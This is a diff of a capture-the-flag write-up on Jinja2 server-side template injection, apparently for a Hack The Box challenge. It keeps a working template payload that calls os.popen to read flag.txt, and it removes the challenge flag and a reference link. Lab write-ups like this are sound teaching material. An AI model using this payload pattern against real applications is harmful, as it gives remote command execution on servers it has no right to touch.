@@ -44,14 +44,3 @@ We can see that the list of files and directories is returned. One file among th
 Now lets read the contents of the flag by using ```{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}```
 
 The output is the the required flag. 
-
-![](assets/images/flag.png)
-
-The flag is: ```HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}```
-
-
-Resources used:
-
-`https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/`
-
-
